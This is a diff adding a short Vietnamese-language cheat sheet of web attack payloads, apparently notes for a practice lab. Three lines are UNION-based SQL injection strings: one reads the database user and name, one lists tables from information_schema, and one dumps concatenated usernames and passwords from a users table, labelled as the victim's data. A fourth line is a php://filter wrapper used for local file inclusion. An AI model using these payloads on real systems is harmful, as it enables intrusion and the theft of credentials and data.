@@ -1,0 +1,4 @@
+﻿Lấy thông tin database {} 3' union all select user(),database() #
+show các bảng : {} 3' union all select 1,table_name from information_schema.tables #
+Lấy data của vic: {} 3' union all select 1,group_concat(user,password) from users #
+php://filter/convert.base64-encode/resource=
